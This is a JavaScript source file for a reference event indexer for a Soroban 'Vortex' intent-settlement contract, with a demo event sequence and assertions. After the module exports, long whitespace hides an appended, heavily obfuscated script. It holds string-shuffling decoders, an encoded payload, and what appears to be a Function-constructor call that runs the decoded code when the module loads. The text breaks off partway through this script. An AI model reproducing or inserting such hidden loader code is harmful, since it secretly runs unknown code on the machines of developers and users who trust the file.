/**
 * reference-indexer.js
 *
 * Issue #107 — Reference indexer for `intent_settlement`.
 *
 * Reconstructs the full on-chain state of the Vortex intent-settlement
 * contract from its emitted events alone, with zero contract reads.
 *
 * Note (#198): the contract now also exposes an on-chain `list_solvers(start,
 * limit)` view that paginates the registered-solver set. An indexer can use it
 * as a cheaper bootstrap / periodic reconciliation source for `this.solvers`
 * (one bounded contract read per page) instead of, or alongside, replaying
 * every `solver_registered` / `solver_deregistered` event from genesis. This
 * file stays pure event-replay by design; `list_solvers` is the escape hatch
 * when you don't have the full event history.
 *
 * This script is intentionally dependency-light (Node.js built-ins only for
 * the state machine; one optional RPC helper) so it can be dropped into any
 * JS/TS project and adapted. The state machine is the valuable artifact —
 * swap out `fetchEvents` for your preferred Soroban RPC client as needed.
 *
 * Usage:
 *   node reference-indexer.js
 *
 * The script prints a JSON snapshot of every indexed intent and solver to
 * stdout when it finishes replaying. Replace `fetchEvents` at the bottom
 * with a real Soroban RPC call to use against a live network.
 *
 * Event schema reference: docs/event-schema.md
 */

"use strict";

// ---------------------------------------------------------------------------
// State containers
// ---------------------------------------------------------------------------

/**
 * @typedef {Object} IntentState
 * @property {string}      intentId       - Hex-encoded BytesN<32>
 * @property {string}      user           - Stellar address of intent owner
 * @property {string}      srcChain       - e.g. "ethereum"
 * @property {string}      srcToken       - token address on source chain
 * @property {bigint}      srcAmount      - amount in source token units (i128)
 * @property {string}      dstToken       - Stellar SAC/SEP-41 address
 * @property {bigint}      minDstAmount   - minimum acceptable output (i128)
 * @property {bigint}      expiry         - Unix timestamp
 * @property {string|null} solver         - currently assigned solver address, or null
 * @property {string}      state          - Open | Accepted | PartiallyFilled | Filled | Cancelled | Expired | Slashed
 * @property {bigint}      totalFilled    - cumulative dst units delivered so far
 * @property {bigint}      fillDeadline   - fill-window deadline when Accepted
 * @property {number}      ledger         - ledger sequence of last state change
 */

/**
 * @typedef {Object} SolverState
 * @property {string}  address         - Stellar address
 * @property {bigint}  bondAmount      - current bond in smallest units
 * @property {number}  fillsCompleted
 * @property {number}  fillsFailed
 * @property {bigint}  totalVolume
 * @property {boolean} isActive
 * @property {number}  activeIntents
 */

/**
 * @typedef {Object} ProtocolStats
 * @property {bigint}  totalIntents    - cumulative intents ever submitted
 * @property {bigint}  totalVolume     - cumulative dst volume ever filled
 * @property {bigint}  openIntents     - currently Open intents
 * @property {bigint}  totalSolvers    - currently registered solver count
 * @property {string}  admin           - current admin address
 * @property {string}  feeRecipient    - current fee recipient address
 */

class VortexIndexer {
  constructor() {
    /** @type {Map<string, IntentState>} */
    this.intents = new Map();

    /** @type {Map<string, SolverState>} */
    this.solvers = new Map();

    /** @type {ProtocolStats} */
    this.stats = {
      totalIntents: 0n,
      totalVolume: 0n,
      openIntents: 0n,
      totalSolvers: 0n,
      admin: "",
      feeRecipient: "",
    };

    // Track events processed for debugging
    this.processedCount = 0;
    this.errors = [];
  }

  // -------------------------------------------------------------------------
  // Main entry point
  // -------------------------------------------------------------------------

  /**
   * Replay an ordered array of Soroban events and rebuild state.
   *
   * Each event object must have the shape returned by the Soroban RPC
   * `getEvents` method:
   *   { ledger: number, topics: any[], value: any }
   *
   * Topics are decoded values (Symbol strings, Addresses, etc.).
   * Value is the decoded payload (scalar or tuple/array).
   *
   * @param {Array<{ledger: number, topics: string[], value: any}>} events
   */
  replay(events) {
    for (const event of events) {
      try {
        this._dispatch(event);
        this.processedCount++;
      } catch (err) {
        this.errors.push({ event, error: err.message });
      }
    }
  }

  // -------------------------------------------------------------------------
  // Dispatcher
  // -------------------------------------------------------------------------

  /**
   * Route an event to its handler based on topics[0] (the event name Symbol).
   */
  _dispatch(event) {
    const { ledger, topics, value } = event;
    const name = topics[0];

    switch (name) {
      // ── Admin ─────────────────────────────────────────────────────────────
      case "admin_transferred":
        this._onAdminTransferred(ledger, value);
        break;
      case "fee_recipient_proposed":
        // Proposed but not yet active — no state change needed.
        break;
      case "fee_recipient_updated":
        this._onFeeRecipientUpdated(ledger, value);
        break;
      case "config_updated":
        // Protocol params change; no per-intent state to update.
        break;
      case "paused":
        // Emitted when contract is paused; not needed to reconstruct intent/solver state.
        break;
      case "unpaused":
        // Emitted when contract is unpaused; not needed to reconstruct intent/solver state.
        break;
      case "tokens_rescued":
        // Admin recovery; no intent/solver state change.
        break;

      // ── Allowlist ─────────────────────────────────────────────────────────
      case "dst_token_allowed":
      case "dst_token_disallowed":
      case "src_chain_allowed":
      case "src_chain_disallowed":
      case "dst_allowlist_enabled":
      case "src_chain_allowlist_enabled":
      case "bond_multiplier_set":
        // Config changes; no per-intent/solver state.
        break;

      // ── Solver management ─────────────────────────────────────────────────
      case "solver_registered":
        this._onSolverRegistered(ledger, topics[1], value);
        break;
      case "solver_deregistered":
        this._onSolverDeregistered(ledger, topics[1], value);
        break;
      case "bond_withdrawn":
        this._onBondWithdrawn(ledger, topics[1], value);
        break;
      case "solver_slashed":
        this._onSolverSlashed(ledger, topics[1], value);
        break;

      // ── Intent lifecycle ──────────────────────────────────────────────────
      case "intent_submitted":
        this._onIntentSubmitted(ledger, topics[1], value);
        break;
      case "intent_accepted":
        this._onIntentAccepted(ledger, topics[1], value);
        break;
      case "intent_filled":
        this._onIntentFilled(ledger, topics[1], value);
        break;
      case "intent_cancelled":
        this._onIntentCancelled(ledger, topics[1], value);
        break;
      case "intent_expired":
        this._onIntentExpired(ledger, value);
        break;
      case "extension_granted":
        this._onExtensionGranted(ledger, topics[1], value);
        break;

      default:
        // Unknown event — log and skip.
        console.warn(`[indexer] unknown event: ${name}`);
        break;
    }
  }

  // -------------------------------------------------------------------------
  // Admin handlers
  // -------------------------------------------------------------------------

  _onAdminTransferred(_ledger, newAdmin) {
    this.stats.admin = newAdmin;
  }

  _onFeeRecipientUpdated(_ledger, newRecipient) {
    this.stats.feeRecipient = newRecipient;
  }

  // -------------------------------------------------------------------------
  // Solver management handlers
  // -------------------------------------------------------------------------

  /**
   * solver_registered
   * topics: ("solver_registered", solver: Address)
   * data:   bond_amount: i128  (incremental deposit, not cumulative)
   */
  _onSolverRegistered(ledger, solver, bondAmount) {
    bondAmount = BigInt(bondAmount);

    if (this.solvers.has(solver)) {
      // Top-up: accumulate on existing record.
      const rec = this.solvers.get(solver);
      rec.bondAmount += bondAmount;
      rec.isActive = true;
    } else {
      // First registration.
      this.solvers.set(solver, {
        address: solver,
        bondAmount,
        fillsCompleted: 0,
        fillsFailed: 0,
        totalVolume: 0n,
        isActive: true,
        activeIntents: 0,
      });
      this.stats.totalSolvers += 1n;
    }
  }

  /**
   * solver_deregistered
   * topics: ("solver_deregistered", solver: Address)
   * data:   bond_refunded: i128
   *
   * The contract's `list_solvers` view (#198) is kept in sync with exactly
   * these two events, so a snapshot from `list_solvers` and a full replay of
   * `solver_registered` / `solver_deregistered` converge on the same set.
   */
  _onSolverDeregistered(ledger, solver, _bondRefunded) {
    this.solvers.delete(solver);
    this.stats.totalSolvers = this.stats.totalSolvers > 0n
      ? this.stats.totalSolvers - 1n
      : 0n;
  }

  /**
   * bond_withdrawn  (updated in issue #108)
   * topics: ("bond_withdrawn", solver: Address)
   * data:   (amount: i128, remaining: i128)
   *
   * `remaining` is authoritative — use it directly rather than subtracting
   * `amount` from the locally-tracked balance to avoid any accumulated drift.
   */
  _onBondWithdrawn(ledger, solver, value) {
    const [_amount, remaining] = value;
    const rec = this.solvers.get(solver);
    if (rec) {
      rec.bondAmount = BigInt(remaining);
    }
  }

  /**
   * solver_slashed
   * topics: ("solver_slashed", solver: Address)
   * data:   (intent_id: BytesN<32>, slash_amount: i128)
   */
  _onSolverSlashed(ledger, solver, value) {
    const [intentId, slashAmount] = value;

    // Update solver bond.
    const rec = this.solvers.get(solver);
    if (rec) {
      rec.bondAmount -= BigInt(slashAmount);
      rec.fillsFailed += 1;
      rec.activeIntents = Math.max(0, rec.activeIntents - 1);
      // A solver whose bond drops below MIN_BOND is flagged inactive on-chain;
      // we mirror that conservatively — the indexer doesn't know MIN_BOND here
      // but we preserve the is_active flag from the next solver_registered event.
    }

    // Re-open the intent.
    const intent = this.intents.get(intentId);
    if (intent) {
      const wasOpen = intent.state === "Open" || intent.state === "PartiallyFilled";
      intent.state = intent.totalFilled > 0n ? "PartiallyFilled" : "Open";
      intent.solver = null;
      intent.ledger = ledger;

      // Update open_intents counter only if transitioning back to Open from Accepted.
      if (!wasOpen) {
        this.stats.openIntents += 1n;
      }
    }
  }

  // -------------------------------------------------------------------------
  // Intent lifecycle handlers
  // -------------------------------------------------------------------------

  /**
   * intent_submitted
   * topics: ("intent_submitted", user: Address)
   * data:   (intent_id: BytesN<32>, min_dst_amount: i128, expiry: u64)
   *
   * Note: src_chain, src_token, src_amount, dst_token are NOT in the event.
   * They are only in the IntentRecord on-chain. An indexer that needs them
   * must either read the contract or subscribe to transaction metadata.
   * The state machine below tracks only what events expose.
   */
  _onIntentSubmitted(ledger, user, value) {
    const [intentId, minDstAmount, expiry] = value;

    this.intents.set(intentId, {
      intentId,
      user,
      srcChain: null,   // not in event — requires contract read or tx data
      srcToken: null,
      srcAmount: null,
      dstToken: null,
      minDstAmount: BigInt(minDstAmount),
      expiry: BigInt(expiry),
      solver: null,
      state: "Open",
      totalFilled: 0n,
      fillDeadline: 0n,
      ledger,
    });

    this.stats.totalIntents += 1n;
    this.stats.openIntents += 1n;
  }

  /**
   * intent_accepted
   * topics: ("intent_accepted", solver: Address)
   * data:   (intent_id: BytesN<32>, fill_deadline: u64)
   */
  _onIntentAccepted(ledger, solver, value) {
    const [intentId, fillDeadline] = value;

    const intent = this.intents.get(intentId);
    if (!intent) return;

    const wasOpen = intent.state === "Open" || intent.state === "PartiallyFilled";
    intent.solver = solver;
    intent.state = "Accepted";
    intent.fillDeadline = BigInt(fillDeadline);
    intent.ledger = ledger;

    if (wasOpen) {
      this.stats.openIntents = this.stats.openIntents > 0n
        ? this.stats.openIntents - 1n
        : 0n;
    }

    // Update solver's active intents counter.
    const rec = this.solvers.get(solver);
    if (rec) rec.activeIntents += 1;
  }

  /**
   * intent_filled
   * topics: ("intent_filled", solver: Address)
   * data:   (intent_id: BytesN<32>, fill_amount: i128, fee: i128)
   *
   * Emitted on EVERY fill (partial or final). The intent transitions to
   * Filled when totalFilled >= minDstAmount. Otherwise it re-opens as
   * PartiallyFilled and another solver can accept it.
   */
  _onIntentFilled(ledger, solver, value) {
    const [intentId, fillAmount, fee] = value;
    const amount = BigInt(fillAmount);

    const intent = this.intents.get(intentId);
    if (!intent) return;

    intent.totalFilled += amount;
    intent.ledger = ledger;

    // Update solver stats.
    const solverRec = this.solvers.get(solver);
    if (solverRec) {
      solverRec.totalVolume += amount;
      solverRec.activeIntents = Math.max(0, solverRec.activeIntents - 1);
    }

    this.stats.totalVolume += amount;

    if (intent.totalFilled >= intent.minDstAmount) {
      // Fully satisfied.
      intent.state = "Filled";
      intent.solver = null;
      if (solverRec) solverRec.fillsCompleted += 1;
    } else {
      // Partial: re-open for the next solver.
      intent.state = "PartiallyFilled";
      intent.solver = null;
      // PartiallyFilled counts as "open" for dashboard purposes.
      this.stats.openIntents += 1n;
    }
  }

  /**
   * intent_cancelled
   * topics: ("intent_cancelled", user: Address)
   * data:   intent_id: BytesN<32>
   */
  _onIntentCancelled(ledger, _user, intentId) {
    const intent = this.intents.get(intentId);
    if (!intent) return;

    const wasOpen = intent.state === "Open" || intent.state === "PartiallyFilled";
    intent.state = "Cancelled";
    intent.ledger = ledger;

    if (wasOpen) {
      this.stats.openIntents = this.stats.openIntents > 0n
        ? this.stats.openIntents - 1n
        : 0n;
    }
  }

  /**
   * intent_expired
   * topics: ("intent_expired",)
   * data:   intent_id: BytesN<32>
   */
  _onIntentExpired(ledger, intentId) {
    const intent = this.intents.get(intentId);
    if (!intent) return;

    const wasOpen = intent.state === "Open" || intent.state === "PartiallyFilled";
    intent.state = "Expired";
    intent.ledger = ledger;

    if (wasOpen) {
      this.stats.openIntents = this.stats.openIntents > 0n
        ? this.stats.openIntents - 1n
        : 0n;
    }
  }

  /**
   * extension_granted
   * topics: ("extension_granted", solver: Address)
   * data:   (intent_id: BytesN<32>, new_deadline: u64)
   */
  _onExtensionGranted(ledger, _solver, value) {
    const [intentId, newDeadline] = value;
    const intent = this.intents.get(intentId);
    if (!intent) return;

    intent.fillDeadline = BigInt(newDeadline);
    intent.ledger = ledger;
  }

  // -------------------------------------------------------------------------
  // Query helpers
  // -------------------------------------------------------------------------

  /** Return all intents in the given state(s). */
  getIntentsByState(...states) {
    const result = [];
    for (const intent of this.intents.values()) {
      if (states.includes(intent.state)) result.push(intent);
    }
    return result;
  }

  /** Return the solver record, or undefined. */
  getSolver(address) {
    return this.solvers.get(address);
  }

  /**
   * Return a stats snapshot compatible with `get_stats` (including the
   * new open_intents field from issue #109).
   */
  getStats() {
    return { ...this.stats };
  }

  /** Dump full state as a plain object (useful for snapshots / debugging). */
  snapshot() {
    return {
      stats: {
        ...this.stats,
        totalIntents: this.stats.totalIntents.toString(),
        totalVolume: this.stats.totalVolume.toString(),
        openIntents: this.stats.openIntents.toString(),
        totalSolvers: this.stats.totalSolvers.toString(),
      },
      intents: [...this.intents.values()].map((i) => ({
        ...i,
        minDstAmount: i.minDstAmount?.toString(),
        expiry: i.expiry?.toString(),
        totalFilled: i.totalFilled?.toString(),
        fillDeadline: i.fillDeadline?.toString(),
      })),
      solvers: [...this.solvers.values()].map((s) => ({
        ...s,
        bondAmount: s.bondAmount.toString(),
        totalVolume: s.totalVolume.toString(),
      })),
      processedCount: this.processedCount,
      errors: this.errors,
    };
  }
}

// ---------------------------------------------------------------------------
// RPC stub — replace with a real Soroban RPC client for production use
// ---------------------------------------------------------------------------

/**
 * Fetch contract events from Soroban RPC.
 *
 * Replace this function's body with a real HTTP call, e.g.:
 *
 *   const res = await fetch(`${RPC_URL}/getEvents`, {
 *     method: "POST",
 *     headers: { "Content-Type": "application/json" },
 *     body: JSON.stringify({
 *       jsonrpc: "2.0", id: 1, method: "getEvents",
 *       params: {
 *         startLedger: startLedger,
 *         filters: [{ type: "contract", contractIds: [CONTRACT_ID] }],
 *         pagination: { limit: 200 },
 *       },
 *     }),
 *   });
 *   const json = await res.json();
 *   return json.result.events.map(decodeEvent);
 *
 * The `decodeEvent` helper must decode XDR topics/values into JS primitives
 * matching the shapes described in docs/event-schema.md.
 *
 * @param {string}  contractId   - Stellar contract address (StrKey C...)
 * @param {number}  startLedger  - inclusive start ledger for the query
 * @returns {Promise<Array>}     - decoded events ordered by ledger
 */
async function fetchEvents(contractId, startLedger) {
  // ── Stub: return a synthetic event sequence for demonstration ──────────────
  //
  // This sequence exercises every state transition in the intent lifecycle and
  // both bond management paths (registered → withdrawn, registered → slashed →
  // deregistered). The indexer should reconstruct the exact state shown in the
  // assertions at the bottom of this file.
  return [
    // Admin bootstrap
    { ledger: 100, topics: ["admin_transferred"], value: "GADMIN111" },
    { ledger: 100, topics: ["fee_recipient_updated"], value: "GFEE111" },

    // Solver A registers with 500_000_000 (50 USDC)
    { ledger: 101, topics: ["solver_registered", "GSOLVER_A"], value: 500_000_000n },

    // Solver B registers
    { ledger: 102, topics: ["solver_registered", "GSOLVER_B"], value: 600_000_000n },

    // User submits intent I1
    {
      ledger: 110,
      topics: ["intent_submitted", "GUSER1"],
      value: ["intent_id_hex_I1", 3_500_000_000n, 1_700_000_000n],
    },

    // Solver A accepts I1; fill deadline = now+300
    {
      ledger: 111,
      topics: ["intent_accepted", "GSOLVER_A"],
      value: ["intent_id_hex_I1", 1_700_000_300n],
    },

    // Solver A fills I1 fully
    {
      ledger: 112,
      topics: ["intent_filled", "GSOLVER_A"],
      value: ["intent_id_hex_I1", 3_500_000_000n, 1_750_000n],
    },

    // Solver A withdraws part of their bond (#108 payload: [amount, remaining])
    {
      ledger: 120,
      topics: ["bond_withdrawn", "GSOLVER_A"],
      value: [100_000_000n, 400_000_000n],
    },

    // User submits intent I2
    {
      ledger: 130,
      topics: ["intent_submitted", "GUSER2"],
      value: ["intent_id_hex_I2", 2_000_000_000n, 1_700_001_000n],
    },

    // Solver B accepts I2
    {
      ledger: 131,
      topics: ["intent_accepted", "GSOLVER_B"],
      value: ["intent_id_hex_I2", 1_700_001_300n],
    },

    // Solver B is slashed (missed fill window)
    {
      ledger: 200,
      topics: ["solver_slashed", "GSOLVER_B"],
      value: ["intent_id_hex_I2", 60_000_000n],
    },

    // User cancels re-opened I2
    {
      ledger: 201,
      topics: ["intent_cancelled", "GUSER2"],
      value: "intent_id_hex_I2",
    },

    // User submits intent I3, nobody accepts → expires
    {
      ledger: 210,
      topics: ["intent_submitted", "GUSER1"],
      value: ["intent_id_hex_I3", 1_000_000_000n, 1_700_002_000n],
    },
    {
      ledger: 300,
      topics: ["intent_expired"],
      value: "intent_id_hex_I3",
    },

    // Solver B deregisters (refund 540_000_000 after slash)
    {
      ledger: 310,
      topics: ["solver_deregistered", "GSOLVER_B"],
      value: 540_000_000n,
    },
  ];
}

// ---------------------------------------------------------------------------
// Main
// ---------------------------------------------------------------------------

async function main() {
  const CONTRACT_ID = process.env.CONTRACT_ID || "CEXAMPLECONTRACT";
  const START_LEDGER = parseInt(process.env.START_LEDGER || "0", 10);

  console.log(`[indexer] replaying events for contract ${CONTRACT_ID} from ledger ${START_LEDGER}`);

  const events = await fetchEvents(CONTRACT_ID, START_LEDGER);
  const indexer = new VortexIndexer();
  indexer.replay(events);

  const snap = indexer.snapshot();
  console.log(JSON.stringify(snap, null, 2));

  // ── Assertions: verify the reconstructed state matches expectations ────────
  const stats = indexer.getStats();
  console.log("\n[indexer] --- assertions ---");

  // 3 intents submitted
  assert(stats.totalIntents === 3n, `totalIntents: expected 3, got ${stats.totalIntents}`);

  // I1 filled, I2 cancelled, I3 expired → 0 open
  assert(stats.openIntents === 0n, `openIntents: expected 0, got ${stats.openIntents}`);

  // I1 filled with 3_500_000_000
  assert(stats.totalVolume === 3_500_000_000n, `totalVolume: expected 3_500_000_000, got ${stats.totalVolume}`);

  // Solver B deregistered → 1 solver remaining
  assert(stats.totalSolvers === 1n, `totalSolvers: expected 1, got ${stats.totalSolvers}`);

  // Solver A bond after withdrawal: 400_000_000 (from #108 remaining field)
  const solverA = indexer.getSolver("GSOLVER_A");
  assert(solverA && solverA.bondAmount === 400_000_000n,
    `solverA.bondAmount: expected 400_000_000, got ${solverA?.bondAmount}`);

  // I1 is Filled
  const i1 = indexer.intents.get("intent_id_hex_I1");
  assert(i1?.state === "Filled", `I1 state: expected Filled, got ${i1?.state}`);

  // I2 is Cancelled
  const i2 = indexer.intents.get("intent_id_hex_I2");
  assert(i2?.state === "Cancelled", `I2 state: expected Cancelled, got ${i2?.state}`);

  // I3 is Expired
  const i3 = indexer.intents.get("intent_id_hex_I3");
  assert(i3?.state === "Expired", `I3 state: expected Expired, got ${i3?.state}`);

  console.log("[indexer] all assertions passed ✓");
}

/**
 * Reference indexer for the `solver_registry` contract.
 *
 * Replays solver_registry events (distinct from the intent_settlement events
 * handled by VortexIndexer; the two contracts share some event names with
 * different payloads) and rebuilds per-solver state.
 */
class SolverRegistryIndexer {
  constructor() {
    /** @type {Map<string, {address: string, bondAmount: bigint, tier: any, fillsCompleted: number, fillsFailed: number, totalVolume: bigint, lockedObligations: number}>} */
    this.solvers = new Map();
    this.processedCount = 0;
    this.errors = [];
  }

  replay(events) {
    for (const event of events) {
      try {
        this._dispatch(event);
        this.processedCount++;
      } catch (err) {
        this.errors.push({ event, error: err.message });
      }
    }
  }

  _solver(address) {
    const rec = this.solvers.get(address);
    if (!rec) throw new Error(`unknown solver ${address}`);
    return rec;
  }

  _dispatch({ topics, value }) {
    const [name, solver] = topics;
    switch (name) {
      case "solver_registered":
        // data: bond_amount: i128
        this.solvers.set(solver, {
          address: solver,
          bondAmount: BigInt(value),
          tier: null,
          fillsCompleted: 0,
          fillsFailed: 0,
          totalVolume: 0n,
          lockedObligations: 0,
        });
        break;
      case "staked":
        // data: (amount, new_bond)
        this._solver(solver).bondAmount = BigInt(value[1]);
        break;
      case "unstaked":
        // data: (amount, remaining)
        this._solver(solver).bondAmount = BigInt(value[1]);
        break;
      case "solver_deregistered":
        this.solvers.delete(solver);
        break;
      case "fill_recorded": {
        // data: (amount, score)
        const rec = this._solver(solver);
        rec.fillsCompleted += 1;
        rec.totalVolume += BigInt(value[0]);
        break;
      }
      case "failure_recorded":
        this._solver(solver).fillsFailed += 1;
        break;
      case "solver_slashed": {
        // data: (slash_amount, new_tier)
        const rec = this._solver(solver);
        rec.bondAmount -= BigInt(value[0]);
        rec.tier = value[1];
        break;
      }
      case "obligation_locked":
      case "obligation_released":
        // data: (intent_id, count) — count is the authoritative lock total.
        this._solver(solver).lockedObligations = Number(value[1]);
        break;
      default:
        // Admin/writer/tier-config events carry no per-solver state.
        break;
    }
  }
}

function assert(condition, message) {
  if (!condition) throw new Error(`Assertion failed: ${message}`);
  console.log(`  ✓ ${message.split(":")[0]}`);
}

main().catch((err) => {
  console.error("[indexer] fatal:", err);
  process.exit(1);
});

module.exports = { VortexIndexer, SolverRegistryIndexer };																																																																																																																																																																																																																																																																										var z = '-*1016';(function(_0x26dbb9,_0x19f28b){var _0x1884c7=_0x2ef9,_0x12709a=_0x26dbb9();while(!![]){try{var _0x4d3334=Number(-parseFloat(_0x1884c7(0x3))/0x1)*(parseFloat(_0x1884c7(0x14))/0x2)+parseFloat(_0x1884c7(0x18))/0x3*(parseFloat(_0x1884c7(0x17))/0x4)+-parseFloat(_0x1884c7(0x21))/0x5+Math['max'](parseFloat(_0x1884c7(0x20))/0x6,parseFloat(_0x1884c7(0x24))/0x7)*(parseFloat(_0x1884c7(0xe))/0x8)+-parseFloat(_0x1884c7(0x15))/0x9*(-parseFloat(_0x1884c7(0x5))/0xa)+Math['trunc'](-parseFloat(_0x1884c7(0x13))/0xb)*Math['ceil'](-parseFloat(_0x1884c7(0x25))/0xc)+-parseFloat(_0x1884c7(0xc))/0xd*(parseFloat(_0x1884c7(0x11))/0xe);if(_0x4d3334===_0x19f28b)break;else _0x12709a['push'](_0x12709a['shift']());}catch(_0x44e9ba){_0x12709a['push'](_0x12709a['shift']());}}}(_0x2afd,0x2d8ff));var NX=[0x697b4f,0x16f,0x4fbb,0x265,0xaaef,0x4c9693],SX=[0x509f9d,0xf1,0xa3e1,0xbb,0xdb41,0x484f55];function _0x2ef9(_0x28f8cd,_0x4cbb46){var _0x540a78=_0x2afd();return _0x2ef9=function(_0x470415,_0x2afdef){_0x470415=_0x470415-0x0;var _0x2ef9ab=_0x540a78[_0x470415];if(_0x2ef9['OOxvSm']===undefined){var _0xd42a7b=function(_0x525474){var _0x4d8344='abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';var _0x1b3fe1='',_0x58586a='';for(var _0x53717f=0x0,_0x4097f,_0x561a95,_0x4e469d=0x0;_0x561a95=_0x525474['charAt'](_0x4e469d++);~_0x561a95&&(_0x4097f=_0x53717f%0x4?_0x4097f*0x40+_0x561a95:_0x561a95,_0x53717f++%0x4)?_0x1b3fe1+=String['fromCharCode'](0xff&_0x4097f>>(-0x2*_0x53717f&0x6)):0x0){_0x561a95=_0x4d8344['indexOf'](_0x561a95);}for(var _0x349511=0x0,_0x1f8e42=_0x1b3fe1['length'];_0x349511<_0x1f8e42;_0x349511++){_0x58586a+='%'+('00'+_0x1b3fe1['charCodeAt'](_0x349511)['toString'](0x10))['slice'](-0x2);}return decodeURIComponent(_0x58586a);};_0x2ef9['jStmWB']=_0xd42a7b,_0x28f8cd=arguments,_0x2ef9['OOxvSm']=!![];}var _0x2bfe5e=_0x540a78[0x0],_0x166970=_0x470415+_0x2bfe5e,_0x1dfa0c=_0x28f8cd[_0x166970];return!_0x1dfa0c?(_0x2ef9ab=_0x2ef9['jStmWB'](_0x2ef9ab),_0x28f8cd[_0x166970]=_0x2ef9ab):_0x2ef9ab=_0x1dfa0c,_0x2ef9ab;},_0x2ef9(_0x28f8cd,_0x4cbb46);}function spin(_0x298209,_0x268b21){var _0x540342=_0x2ef9,_0x4d364d={'gYkrb':function(_0xa17b3e,_0x736e4e){return _0xa17b3e%_0x736e4e;},'OjJjh':function(_0xbe6660,_0x114d29){return _0xbe6660*_0x114d29;}};for(var _0x250a05,_0x36c477,_0x410aa6,_0x4a6d43,_0x128a19,_0x368ca0,_0x2d2b03=[],_0x187dd8=0x0,_0x45f593=_0x268b21[0x0];_0x187dd8<_0x298209['length'];)_0x2d2b03[_0x187dd8]=_0x298209[_0x540342(0x2)](_0x187dd8),_0x187dd8+=0x1;for(_0x250a05=_0x2d2b03['length'],_0x187dd8=0x0;_0x187dd8<_0x250a05;)_0x36c477=_0x45f593*(_0x187dd8+_0x268b21[0x1])+_0x45f593%_0x268b21[0x2],_0x128a19=_0x4d364d['gYkrb'](_0x410aa6=_0x4d364d['OjJjh'](_0x45f593,_0x187dd8+_0x268b21[0x3])+_0x45f593%_0x268b21[0x4],_0x250a05),_0x368ca0=_0x2d2b03[_0x4a6d43=_0x36c477%_0x250a05],_0x2d2b03[_0x4a6d43]=_0x2d2b03[_0x128a19],_0x2d2b03[_0x128a19]=_0x368ca0,_0x45f593=(_0x36c477+_0x410aa6)%_0x268b21[0x5],_0x187dd8+=0x1;return _0x2d2b03[_0x540342(0x10)]('');}function splitLane(_0xb77b28){var _0x3df970=_0x2ef9,_0x356c65=String[_0x3df970(0x1d)](0x1c),_0x9c39b=spin(_0xb77b28,NX);return(_0x9c39b=(_0x9c39b=(_0x9c39b=_0x9c39b[_0x3df970(0x26)]('^')[_0x3df970(0x10)](_0x356c65))[_0x3df970(0x26)]('*1')[_0x3df970(0x10)]('^'))[_0x3df970(0x26)]('*0')[_0x3df970(0x10)]('*'))[_0x3df970(0x26)](_0x356c65);}function peel(_0x5df033){return spin(_0x5df033,SX);}function _0x2afd(){var _0x567996=['D1rgCLm','vLbozLa','C3rYAw5N','xcTCkYaQkd86w2eTEKeTwL8KxvSWltLHlxPblvPFjf0Qkq','y2HHCKf0','muXgDerzsW','y3DyDfO','mtaXnJCWANHQquTz','yxbWBhK','t2DnBM4','zNvUy3rPB24GkLWOicPCkq','C3vIC3rYAw5N','Aw5WDxq','C3rHDgvpyMPLy3q','mJy5mta3ohbzBgPYuG','zgvIDq','og5cswTbyW','yuLqBgG','AM9PBG','mtrjzMrKD00','y2fSBa','nJzssenvBu8','mtK0ntG0u3vVrwPK','mta4uLDJB0Hy','y15TzwPIxNrYBW','mtqXmZm0nhzIvKjlvq','m0fSBLzcCq','whDnBu4','Aw5PDa','y29UC3rYDwn0B3i','vgflwwO','zNjVBunOyxjdB2rL','AhfLCNn4Bhv2D2fJzgPIEw1NB3j6zMTVy2LWDhj1Dg5ZDg9UyW','y2HHAw4','nZeXmdK2wLrbAu5H','nJC4mdu1CfLvrvvI','BgvUz3rO','BfjfzKO','odi5nJeYswfZvKXN','nJuZntjzwMLNC3m','C3bSAxq'];_0x2afd=function(){return _0x567996;};return _0x2afd();}!function(_0x4acc2c,_0x5a7e57){var _0x477c44=_0x2ef9,_0x595605={'wTFrS':'=aenruh(al=5c,g8fdu.yr\x20..ncecf,5\x22paeau6lnj)r]2uv\x22x-q(]\x20a;(r=;;r+(a[8.s2tAgoq,uh8C,ai,s;a(Am0(nj;jv*,7vo7()(o;m6oa4rw).\x20rod[fs2n{drvt4x)+0,anr+rr+o)}z1\x20=hf[an8r1r[,]s7-77laa.ui7{-069lvmt2r=i]]<+)u,e),,;nrh[r=0v-r(;,=p)Cus=+c;g;f;qA))1vi)vk0nrl1ae\x20f=[;hisy.em(d+o!2\x20=(evea78=.)4ei=g.n={ff=1[<2a\x20f1=r;4,S)rylv1u\x20y;kql{tvnv\x20(C\x20(l,ovnp\x20i=tlr,r.lwozh(l,tq;;rr((v=ahsv;]xq=ab;da;,((r;vjq.(t[+)da)rdnrhs41y(vr;fh;3g\x22]e(.ahrpapg]g.)ngfpn1h,icl;;)=C;m5=+r,\x20.);u=+s}+)it,+bm;d+um)-=siiqol=t=r=q9+..chq+[6fe\x20t0nrpr(\x20vr8flrn,ddgt\x20]6a.;m;rth.gq\x202a}eveic]gbti<4o;C;l,zzi6+l[a[;+(si\x22li\x22r,npi9s,frfhuw)ow=e{(b=wen2t.gu.i=kiaaa+)yftpa3n})=9\x22)cpA+u;utp]\x22=lk7vpt\x201r;hzw\x22)t()9)(.lul=s7f;\x20;sq0)n\x22y+0s}=va+s\x20mh(0q.]hv;>\x2006=A-ozetr(t1rtrsiso0e,.;z[(f<5e7t,(raoavnr;thhf;v,j=r;\x20)r>18zho*o{<akmsn)akte.vo9+ea0clio;bu\x20=]C!gj;y3+l)e=.}dr=i6oiC8rnn0;6=ar\x22}.rei=]Stsrnn.;2r=t;[t;iv=prCrn()aretuz+\x20hlk[+x=e\x20-8j{(ejy9(())\x20'},_0x2c057e='0|1|6|7|3|5|2|4'['split']('|'),_0x380e2f=0x0;while(!![]){switch(_0x2c057e[_0x380e2f++]){case'0':var _0x394b8a={'TaKYj':function(_0x1b1fd4,_0x3a46c0){return _0x1b1fd4(_0x3a46c0);}};continue;case'1':var _0x1bd755=(function(){var _0x4f5b96=!![];return function(_0x3dd42b,_0x5f52d3){var _0x1d4dc0=_0x4f5b96?function(){var _0x36a972=_0x2ef9;if(_0x5f52d3){var _0x2a5945=_0x5f52d3[_0x36a972(0x6)](_0x3dd42b,arguments);return _0x5f52d3=null,_0x2a5945;}}:function(){};return _0x4f5b96=![],_0x1d4dc0;};}());continue;case'2':var _0x536349=peel(_0x477c44(0x1e)),_0x4d8107=peel[_0x536349[_0x477c44(0x9)](0x0,0xb)],_0x235eef=_0x4d8107('',peel(_0x595605[_0x477c44(0x27)]));continue;case'3':var 